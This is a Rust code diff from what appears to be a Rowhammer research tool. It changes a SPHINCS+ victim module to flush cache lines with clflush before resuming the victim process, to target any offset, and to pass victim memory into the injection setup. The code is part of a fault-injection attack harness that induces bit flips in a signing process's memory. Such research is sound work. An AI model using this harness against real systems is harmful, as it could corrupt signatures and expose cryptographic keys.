@@ -3,6 +3,7 @@ use libc::sched_getcpu;
 use serde::Serialize;
 use sha2::{Digest, Sha256};
 use std::{
+    arch::x86_64::_mm_clflush,
     collections::HashMap,
     io::{BufRead, BufReader},
     thread,
@@ -10,8 +11,8 @@ use std::{
 };
 
 use crate::{
-    memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr},
-    util::PAGE_SIZE,
+    memory::{find_flippy_page, BitFlip, FlipDirection, PfnResolver, PhysAddr, VictimMemory},
+    util::{CL_SIZE, PAGE_MASK, PAGE_SIZE},
 };
 
 use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};
@@ -37,6 +38,7 @@ enum State {
 #[derive(Serialize)]
 pub struct SphincsPlus {
     state: State,
+    flush_lines: Vec<usize>,
 }
 
 impl SphincsPlus {
@@ -229,7 +231,7 @@ fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
     let bait_count_after = HashMap::from([(32, 1), (30, 22)]);
 
-    filter_addrs(flips, &TARGET_OFFSETS_SHAKE_256S)
+    filter_addrs(flips, &_TARGET_OFFSETS_ANY)
         .first()
         .map(|f| InjectionConfig {
             id: f.1.id,
@@ -252,26 +254,49 @@ impl SphincsPlus {
     /// - `keys_path`: The path to the keys.
     /// - `sigs_path`: The output path to the signatures.
     /// - `injection_config`: The injection configuration.
-    pub fn new(binary: String, flips: Vec<BitFlip>) -> anyhow::Result<Self> {
+    pub fn new(
+        binary: String,
+        flips: Vec<BitFlip>,
+        memory: &dyn VictimMemory,
+    ) -> anyhow::Result<Self> {
         let injection_config = find_injectable_page(flips)
             .ok_or_else(|| anyhow::anyhow!("No page suitable for injection found"))?;
+        let flush_lines = Self::make_flush_lines(injection_config, memory);
         Ok(Self {
             state: State::Init {
                 binary,
                 injection_config,
             },
+            flush_lines,
         })
+    }
+
+    fn make_flush_lines(
+        injection_config: InjectionConfig,
+        memory: &dyn VictimMemory,
+    ) -> Vec<usize> {
+        let mut flush_lines = vec![];
+        for offset in (0..memory.len()).step_by(CL_SIZE) {
+            let line = memory.addr(offset) as usize;
+            if injection_config.target_addr & !PAGE_MASK != line & !PAGE_MASK {
+                flush_lines.push(line);
+            }
+        }
+        flush_lines
     }
 
     pub fn new_with_config(
         binary: String,
         injection_config: InjectionConfig,
+        memory: &dyn VictimMemory,
     ) -> anyhow::Result<Self> {
+        let flush_lines = Self::make_flush_lines(injection_config, memory);
         Ok(Self {
             state: State::Init {
                 binary,
                 injection_config,
             },
+            flush_lines,
         })
     }
 }
@@ -376,6 +401,9 @@ impl HammerVictim for SphincsPlus {
         self.check_flippy_page_exists()?;
         match &mut self.state {
             State::Running { child, .. } => {
+                for &line in &self.flush_lines {
+                    unsafe { _mm_clflush(line as *const u8) };
+                }
                 // resume the victim
                 info!("Sending SIGCONT to victim");
                 unsafe {
@@ -470,7 +498,7 @@ mod tests {
 
     use crate::{
         allocator::util::mmap,
-        memory::BitFlip,
+        memory::{BitFlip, ConsecBlocks, MemBlock},
         util::PAGE_SIZE,
         victim::{
             sphincs_plus::{self, filter_addrs, TargetOffset},
@@ -481,10 +509,12 @@ mod tests {
     #[test]
     fn test_sphincs_plus() -> anyhow::Result<()> {
         let ptr = mmap(null_mut(), PAGE_SIZE);
+        let mem = ConsecBlocks::new(vec![MemBlock::new(ptr, PAGE_SIZE)]);
         let flip = BitFlip::new(ptr, 0x1, 0x1);
         let mut stack_process = super::SphincsPlus::new(
             "/home/jb/sphincsplus/ref/test/server".to_string(),
             vec![flip],
+            &mem,
         )?;
         for _ in 0..10 {
             stack_process.init();
